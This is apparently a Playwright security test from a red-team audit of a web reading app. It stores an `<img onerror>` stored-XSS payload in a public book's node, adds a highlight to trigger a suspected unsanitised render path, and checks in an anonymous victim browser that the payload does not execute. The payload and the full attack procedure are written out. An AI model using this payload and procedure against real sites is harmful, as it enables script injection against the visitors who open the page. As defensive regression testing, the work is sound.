// @ts-check
//
// STORED-XSS PROOF OF CONCEPT
// ===========================
// Hypothesis (from the red-team audit): the server stores node HTML unsanitised,
// and the reader's DOMPurify pass (lazyLoaderFactory.js:1266 `sanitizeHtml`) runs
// AFTER the raw content is assigned to a detached `innerHTML` inside
// applyHighlights/applyHypercites (lines 1525 / 1387). renderBlockToHtml() returns
// `block.content` verbatim. So a node that carries a highlight should route its
// raw HTML through that pre-sanitisation `innerHTML` — and an `<img onerror>`
// would fire before DOMPurify ever sees it.
//
// This test PROVES or DISPROVES that end-to-end in a real Chromium:
//   1. attacker registers + creates a PUBLIC book,
//   2. writes a node whose content contains `<img src=x onerror=…>`,
//   3. adds a highlight on that node (forces applyHighlights to run),
//   4. a FRESH ANONYMOUS context (the "victim") opens the public book,
//   5. we assert whether the payload executed.
//
// The payload sets a window flag AND beacons a uniquely-named request, so we
// detect execution two independent ways. If neither fires, the DOMPurify defence
// holds and the finding is downgraded to the storage-only (Medium) gap.
//
// Run: npx playwright test --config tests/e2e/playwright.security.config.js

import { test, expect } from '@playwright/test';

const BASE = process.env.E2E_BASE_URL || 'http://hyperlit.test';
const MARKER = 'RTXSS_' + Math.random().toString(36).slice(2, 8);

/** Read the (non-HttpOnly) XSRF-TOKEN cookie from a page so we can echo it back. */
async function xsrf(page) {
  return page.evaluate(() => {
    const m = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
    return m ? decodeURIComponent(m[1]) : '';
  });
}

function headers(token) {
  return {
    'Accept': 'application/json',
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest',
    'X-XSRF-TOKEN': token,
    // Sanctum stateful: Origin/Referer must match a SANCTUM_STATEFUL_DOMAINS entry.
    'Origin': BASE,
    'Referer': BASE + '/',
  };
}

/**
 * POST with a couple of retries — rapid repeated runs of this spec can transiently
 * trip a throttle/timing window during setup; that's test-infra noise, not the
 * thing under test, so we retry (refreshing the rotating XSRF token each time).
 */
async function postRetry(page, path, data, label) {
  let last;
  for (let i = 0; i < 4; i++) {
    const token = await xsrf(page);
    last = await page.request.post(BASE + path, { headers: headers(token), data });
    if (last.ok()) return last;
    await page.waitForTimeout(1500);
  }
  return last;
}

test('stored XSS: malicious node + highlight fires in a victim browser', async ({ browser }) => {
  // ---- ATTACKER: provision + build the malicious public book via the API ----
  const actx = await browser.newContext();
  const apage = await actx.newPage();
  await apage.goto(BASE + '/');

  const rand = Math.random().toString(36).slice(2, 8);
  // node_id has a GLOBAL unique constraint (node_chunks_node_id_unique), so it
  // must be unique per run — a fixed id collides with leftover rows.
  const nodeId = 'rtn_' + rand;
  const creds = {
    name: 'xss' + rand,
    email: 'xss_' + rand + '@redteam.local',
    password: 'Redteam!' + rand + 'Aa1',
  };

  // The onerror payload sets a global flag and fires a uniquely-named beacon.
  const payload = `<img src=x onerror="window.__XSS=1;new Image().src='/__${MARKER}__'">`;
  const nodeHtml = `<p>begin ${MARKER}</p>${payload}<p>end</p>`;

  let token = await xsrf(apage);
  const reg = await postRetry(apage, '/api/register',
    { name: creds.name, email: creds.email, password: creds.password, password_confirmation: creds.password });
  expect(reg.ok(), `register should succeed (got ${reg.status()})`).toBeTruthy();

  const login = await postRetry(apage, '/api/login', { email: creds.email, password: creds.password });
  expect(login.ok(), `login should succeed (got ${login.status()})`).toBeTruthy();

  const book = 'rt_xss_' + rand;
  const create = await postRetry(apage, '/api/db/library/bulk-create',
    { data: { book, title: 'xss poc', visibility: 'public', timestamp: 1700000000 } });
  expect(create.ok(), `public book creation should succeed (got ${create.status()})`).toBeTruthy();

  const node = await postRetry(apage, '/api/db/node-chunks/upsert',
    { book, data: [{ book, node_id: nodeId, chunk_id: 1, startLine: 1, type: 'text', content: nodeHtml, plainText: 'begin end' }] });
  expect(node.ok(), `node write should succeed (got ${node.status()})`).toBeTruthy();

  // Attach a highlight to the node so applyHighlights() runs on render — this is
  // the path that innerHTMLs the raw content into a detached div pre-sanitise.
  await postRetry(apage, '/api/db/hyperlights/upsert', {
    data: [{
      book,
      hyperlight_id: 'rt_hl_' + rand,
      node_id: [nodeId],
      charData: { [nodeId]: { charStart: 0, charEnd: 5 } },
      highlightedText: 'begin',
      highlightedHTML: '<mark>begin</mark>',
      annotation: 'poc',
      startLine: 1,
      time_since: 1700000000,
    }],
  });

  // ---- VIEWER: open the public book in the reader and watch for execution ----
  //
  // Use a FRESH, ANONYMOUS context — this is the real threat model: any visitor
  // who opens the attacker's PUBLIC book. (The render path is viewer-agnostic and
  // the malicious highlight is public/hidden=false, so it's served to everyone.)
  const vctx = await browser.newContext();
  const vpage = await vctx.newPage();
  await vpage.goto(BASE + '/');           // establish an anon session first
  await vpage.waitForTimeout(800);

  let beaconHit = false;
  let dataFetched = false;
  vpage.on('request', (req) => {
    if (req.url().includes('__' + MARKER + '__')) beaconHit = true;
    if (req.url().includes(`/books/${book}/`)) dataFetched = true;
  });
  vpage.on('dialog', (d) => d.dismiss().catch(() => {}));

  // Try the reader routes most likely to run the lazy loader.
  let benignRendered = false;
  for (const path of [`/${book}`, `/${book}/edit`]) {
    // domcontentloaded, NOT networkidle — the SPA's Reverb websocket / polling
    // keeps the network perpetually busy, so networkidle would hang to timeout.
    await vpage.goto(BASE + path, { waitUntil: 'domcontentloaded' }).catch(() => {});
    await vpage.waitForTimeout(4000);
    benignRendered = await vpage.evaluate((m) => document.body.innerText.includes(m), MARKER).catch(() => false);
    const f = await vpage.evaluate(() => window.__XSS === 1).catch(() => false);
    if (benignRendered || f || beaconHit) break;
  }

  const flag = await vpage.evaluate(() => window.__XSS === 1).catch(() => false);
  const fired = flag || beaconHit;

  // Inspect the LIVE DOM the victim actually sees.
  const liveDom = await vpage.evaluate(() => {
    const imgs = Array.from(document.querySelectorAll('img'));
    return {
      imgWithOnerror: imgs.some((i) => i.hasAttribute('onerror')),
      scriptInBody: !!document.querySelector('article script, main script, [data-book-id] script'),
      htmlSnippet: (document.querySelector('[data-book-id]') || document.body).innerHTML.slice(0, 500),
    };
  }).catch(() => ({ imgWithOnerror: null, scriptInBody: null, htmlSnippet: '' }));

  console.log(`[xss-poc] book=${book} fired=${fired} (flag=${flag}, beacon=${beaconHit}) `
    + `dataFetched=${dataFetched} benignRendered=${benignRendered} `
    + `liveImgOnerror=${liveDom.imgWithOnerror} liveScript=${liveDom.scriptInBody}`);
  console.log(`[xss-poc] victim DOM snippet: ${liveDom.htmlSnippet.replace(/\s+/g, ' ')}`);

  // Cleanup the throwaway book (best-effort).
  token = await xsrf(apage);
  await apage.request.delete(BASE + '/api/books/' + book, { headers: headers(token) }).catch(() => {});

  // Guard against a meaningless "didn't fire": the victim must have actually
  // loaded and rendered the book, otherwise the negative proves nothing.
  expect(dataFetched, 'victim must have fetched the book data (else the test exercised nothing)').toBeTruthy();
  expect(benignRendered, 'victim must have rendered the node content (the benign marker)').toBeTruthy();

  // The security expectation: with content provably rendered, the payload must
  // NOT have executed and must NOT be present in the live DOM.
  expect(fired, `XSS payload executed in the victim browser (flag=${flag}, beacon=${beaconHit})`).toBeFalsy();
  expect(liveDom.imgWithOnerror, 'no <img onerror> should survive into the live DOM').toBeFalsy();
});
